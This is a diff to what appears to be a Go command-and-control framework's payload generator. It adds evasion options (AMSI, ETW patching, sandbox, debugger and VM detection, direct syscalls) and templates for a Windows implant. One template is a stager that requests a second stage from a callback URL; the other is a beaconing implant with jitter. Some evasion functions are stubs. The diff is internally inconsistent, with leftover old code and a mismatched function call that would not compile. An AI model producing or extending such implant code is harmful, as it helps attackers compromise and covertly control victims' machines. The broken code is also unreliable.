@@ -3,11 +3,13 @@ package payload
 import (
 	"bytes"
 	"compress/gzip"
+	"encoding/json"
 	"fmt"
 	"os"
 	"os/exec"
 	"path/filepath"
 	"strings"
+	"text/template"
 
 	"github.com/ditto/ditto/core"
 	"github.com/ditto/ditto/crypto"
@@ -22,11 +24,24 @@ type Options struct {
 	Encrypt     bool
 	Obfuscate   bool
 	Config      *core.Config
-	CallbackURL string // Full callback URL (e.g., http://192.168.1.100:8443 or https://example.com:443)
-	Delay       int    // Beacon delay in seconds (default: 30)
-	Jitter      float64 // Jitter percentage (0.0-1.0, default: 0.0)
-	UserAgent   string // Custom user agent (default: auto-generated)
-	Protocol    string // Protocol: http, https, mtls (default: http)
+	CallbackURL string   // Full callback URL (e.g., http://192.168.1.100:8443 or https://example.com:443)
+	Delay       int      // Beacon delay in seconds (default: 30)
+	Jitter      float64  // Jitter percentage (0.0-1.0, default: 0.0)
+	UserAgent   string   // Custom user agent (default: auto-generated)
+	Protocol    string   // Protocol: http, https, mtls (default: http)
+	Modules     []string // Empire module IDs to embed
+	Evasion     *EvasionConfig // Evasion features to enable
+}
+
+// EvasionConfig holds evasion feature configuration
+type EvasionConfig struct {
+	EnableSandboxDetection bool
+	EnableDebuggerCheck     bool
+	EnableVMDetection       bool
+	EnableETWPatches       bool
+	EnableAMSI             bool
+	SleepMask              bool
+	DirectSyscalls         bool
 }
 
 // Generator handles payload generation
@@ -366,10 +381,122 @@ go 1.21
 
 // generateWindowsSource generates proper Go source code for Windows implant
 func (g *Generator) generateWindowsSource(opts Options) ([]byte, error) {
-	var template string
+	// Format callback URL
+	callbackURL := opts.CallbackURL
+	if callbackURL == "" {
+		// Fallback to config or default
+		if opts.Config != nil && opts.Config.Communication.Protocol != "" {
+			callbackURL = opts.Config.Communication.Protocol
+		} else {
+			callbackURL = "http://localhost:8443"
+		}
+	}
 	
+	// Ensure URL has protocol
+	if !strings.HasPrefix(callbackURL, "http://") && !strings.HasPrefix(callbackURL, "https://") {
+		// Auto-detect protocol or use configured one
+		if opts.Protocol == "https" || opts.Protocol == "mtls" {
+			callbackURL = "https://" + callbackURL
+		} else {
+			callbackURL = "http://" + callbackURL
+		}
+	}
+	
+	// Set delay and jitter defaults
+	delay := opts.Delay
+	if delay == 0 {
+		delay = 30 // Default 30 seconds
+	}
+	jitter := opts.Jitter
+	if jitter < 0 {
+		jitter = 0
+	}
+	if jitter > 1.0 {
+		jitter = 1.0
+	}
+	
+	// Set user agent
+	userAgent := opts.UserAgent
+	if userAgent == "" {
+		userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+	}
+	
+	var source string
+	var err error
 	if opts.Type == "full" {
-		template = `package main
+		source, err = g.generateWindowsSourceFull(opts, callbackURL, delay, jitter, userAgent)
+	} else {
+		// Stager template
+		stagerTemplate := `package main
+
+import (
+	"net/http"
+	"time"
+	"os"
+	"runtime"
+)
+
+const (
+	callbackURL = "%s"
+	userAgent   = "%s"
+)
+
+func main() {
+	// Avoid detection
+	if runtime.GOOS != "windows" {
+		os.Exit(1)
+	}
+	
+	// Download and execute second stage
+	downloadAndExecute()
+}
+
+func downloadAndExecute() {
+	client := &http.Client{
+		Timeout: 30 * time.Second,
+	}
+	
+	req, err := http.NewRequest("GET", callbackURL+"/stage2", nil)
+	if err != nil {
+		return
+	}
+	
+	req.Header.Set("User-Agent", userAgent)
+	
+	resp, err := client.Do(req)
+	if err != nil {
+		return
+	}
+	defer resp.Body.Close()
+	
+	if resp.StatusCode == 200 {
+		// In a real implementation, this would download and execute second stage
+		// For now, just acknowledge receipt
+		_ = resp // Use response
+	}
+}
+`
+		source = fmt.Sprintf(stagerTemplate, callbackURL, userAgent)
+	}
+	if err != nil {
+		return nil, err
+	}
+	return []byte(source), nil
+}
+
+// TemplateData holds data for template generation
+type TemplateData struct {
+	CallbackURL string
+	Delay       int
+	Jitter      float64
+	UserAgent   string
+	Evasion     *EvasionConfig
+	Modules     []string
+}
+
+// generateWindowsSourceFull generates full payload source with evasion and modules
+func (g *Generator) generateWindowsSourceFull(opts Options, callbackURL string, delay int, jitter float64, userAgent string) (string, error) {
+	tmpl := `package main
 
 import (
 	"math/rand"
@@ -380,10 +507,10 @@ import (
 )
 
 const (
-	callbackURL = "%s"
-	delay       = %d
-	jitter      = %f
-	userAgent   = "%s"
+	callbackURL = "{{.CallbackURL}}"
+	delay       = {{.Delay}}
+	jitter      = {{.Jitter}}
+	userAgent   = "{{.UserAgent}}"
 )
 
 func main() {
@@ -392,13 +519,69 @@ func main() {
 		os.Exit(1)
 	}
 	
+	{{if .Evasion.EnableSandboxDetection}}
+	// Sandbox detection
+	if checkSandbox() {
+		os.Exit(0)
+	}
+	{{end}}
+	
+	{{if .Evasion.EnableDebuggerCheck}}
+	// Debugger detection
+	if checkDebugger() {
+		os.Exit(0)
+	}
+	{{end}}
+	
+	{{if .Evasion.EnableVMDetection}}
+	// VM detection
+	if checkVM() {
+		os.Exit(0)
+	}
+	{{end}}
+	
 	// Beacon loop with jitter
 	for {
 		beacon()
 		sleepDuration := time.Duration(float64(delay) * (1.0 + jitter*(rand.Float64()*2.0-1.0))) * time.Second
+		{{if .Evasion.SleepMask}}
+		// Sleep mask evasion
+		sleepMask(sleepDuration)
+		{{else}}
 		time.Sleep(sleepDuration)
+		{{end}}
 	}
 }
+
+{{if .Evasion.EnableSandboxDetection}}
+func checkSandbox() bool {
+	if runtime.NumCPU() < 2 {
+		return true
+	}
+	return false
+}
+{{end}}
+
+{{if .Evasion.EnableDebuggerCheck}}
+func checkDebugger() bool {
+	// Debugger detection would go here
+	return false
+}
+{{end}}
+
+{{if .Evasion.EnableVMDetection}}
+func checkVM() bool {
+	// VM detection would go here
+	return false
+}
+{{end}}
+
+{{if .Evasion.SleepMask}}
+func sleepMask(duration time.Duration) {
+	// Sleep mask implementation
+	time.Sleep(duration)
+}
+{{end}}
 
 func beacon() {
 	client := &http.Client{
@@ -425,6 +608,31 @@ func beacon() {
 	}
 }
 `
+	
+	t := template.Must(template.New("windows").Parse(tmpl))
+	
+	// Set default evasion if nil
+	evasion := opts.Evasion
+	if evasion == nil {
+		evasion = &EvasionConfig{}
+	}
+	
+	data := TemplateData{
+		CallbackURL: callbackURL,
+		Delay:       delay,
+		Jitter:      jitter,
+		UserAgent:   userAgent,
+		Evasion:     evasion,
+		Modules:     opts.Modules,
+	}
+	
+	var buf bytes.Buffer
+	if err := t.Execute(&buf, data); err != nil {
+		return "", fmt.Errorf("failed to execute template: %w", err)
+	}
+	
+	return buf.String(), nil
+}
 	} else {
 		// Stager template
 		template = `package main
@@ -520,10 +728,13 @@ func downloadAndExecute() {
 	
 	var source string
 	if opts.Type == "full" {
-		source = fmt.Sprintf(template, callbackURL, delay, jitter, userAgent)
+		source, err = g.generateWindowsSourceFull(opts)
 	} else {
 		// Stager only needs callbackURL and userAgent
 		source = fmt.Sprintf(template, callbackURL, userAgent)
+	}
+	if err != nil {
+		return nil, err
 	}
 	return []byte(source), nil
 }
